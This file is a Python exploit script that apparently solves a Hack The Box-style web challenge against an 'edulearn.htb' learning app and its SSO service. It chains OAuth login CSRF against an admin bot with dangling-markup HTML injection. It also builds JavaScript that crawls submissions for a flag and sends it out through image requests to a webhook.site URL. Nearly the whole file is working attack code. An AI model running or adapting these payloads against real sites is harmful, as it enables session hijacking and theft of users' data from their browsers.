#!/usr/bin/env python3
import re
import time
import urllib.parse

import requests

IP = "154.57.164.82"
PORT = 31059
BASE = f"http://{IP}:{PORT}"
APP = f"edulearn.htb:{PORT}"
SSO = f"sso.edulearn.htb:{PORT}"
CLIENT_ID = "1a2abb8b-9bb5-4463-8f74-d7b129bb7040"
HOOK = "https://webhook.site/2b639f7e-5069-44a3-9232-3b22ce2b30fe"
s = requests.Session()

def req(method, path, host, **kwargs):
    headers = {"Host": host}
    headers.update(kwargs.pop("headers", {}))
    return s.request(method, BASE + path, headers=headers, timeout=45, **kwargs)

email = f"xmp{int(time.time())}@x.htb"
password = "password123"
req("POST", "/api/register", SSO, json={"email": email, "password": password, "name": "XMP User"})
req("POST", "/api/login", SSO, json={"email": email, "password": password})
r = req("GET", "/auth", APP, allow_redirects=False)
u = urllib.parse.urlsplit(r.headers["location"])
r = req("GET", u.path + "?" + u.query, SSO, allow_redirects=False)
if r.status_code == 200:
    q = urllib.parse.parse_qs(u.query)
    r = req("POST", "/oauth/authorize", SSO, data={
        "client_id": CLIENT_ID, "scope": "email name",
        "redirect_uri": q["redirect_uri"][0], "state": q.get("state", [""])[0],
        "approved": "true",
    }, allow_redirects=False)
u = urllib.parse.urlsplit(r.headers["location"])
req("GET", u.path + "?" + u.query, APP, allow_redirects=False)

home = req("GET", "/", APP).text
assignment = re.search(r"/assignment/(\d+)", home).group(1)
req("POST", "/profile", APP, data={
    "displayName": "XMP User", "bio": "", "avatar": f"{HOOK}/mx-page",
}, allow_redirects=False)
js = (
    "(async()=>{let h=await fetch('/').then(r=>r.text());"
    "for(let a of [...new Set([...h.matchAll(/\\/assignment\\/(\\d+)/g)].map(m=>m[1]))]){"
    "let p=await fetch('/assignment/'+a).then(r=>r.text());"
    "for(let m of p.matchAll(/\\/submission\\/(\\d+)/g)){"
    "let q=await fetch('/submission/'+m[1]).then(r=>r.text());let f=q.match(/HTB\\{[^}]+\\}/);"
    f"if(f){{new Image().src='{HOOK}/flag?d='+encodeURIComponent(f[0]);return}}"
    "}}})()"
)
dirty = "".join([
    f'<p>DANGLECONTROL</p><img src="{HOOK}/dangle-control" alt="control">',
    f'<img src="{HOOK}/dangle-single?" alt=\'',
    f'<img src="{HOOK}/dangle-double?" alt="',
    f'<img src="{HOOK}/dangle-bare?" alt=',
    f'<img src="{HOOK}/dangle-src?',
])
r = req("POST", "/submit", APP, data={"assignmentId": assignment, "content": dirty}, allow_redirects=False)
page = req("GET", r.headers["location"], APP).text
mine = re.findall(r"/submission/(\d+)", page)
if not mine:
    raise RuntimeError("submission id not found")
submission = mine[0]
rendered = req("GET", f"/submission/{submission}", APP).text
start = rendered.find("DANGLECONTROL")
stored = rendered[start:start + 1800] if start >= 0 else ""
survivors = re.findall(r'<img[^>]+>', stored)
print("submission", submission, "serialized-images", survivors, flush=True)
print("stored-fragment", stored[:1200], flush=True)

hold_uri = f"http://edulearn.htb:{PORT}/oauth/callback/hold"
hold_q = urllib.parse.urlencode({
    "response_type": "code", "client_id": CLIENT_ID,
    "scope": "email name", "redirect_uri": hold_uri,
})
r = req("GET", "/oauth/authorize?" + hold_q, SSO, allow_redirects=False)
code = urllib.parse.parse_qs(urllib.parse.urlsplit(r.headers["location"]).query)["code"][0]
r = req("POST", "/submit-url", APP, data={
    "url": "http://edulearn.htb:1337/oauth/callback?code=" + urllib.parse.quote(code, safe=""),
}, allow_redirects=False)
print("bot author swap", r.status_code, r.headers.get("location"), flush=True)

r = req("POST", "/submit-url", APP, data={"url": f"http://edulearn.htb:1337/submission/{submission}"}, allow_redirects=False)
print("teacher visit", r.status_code, r.headers.get("location"), flush=True)
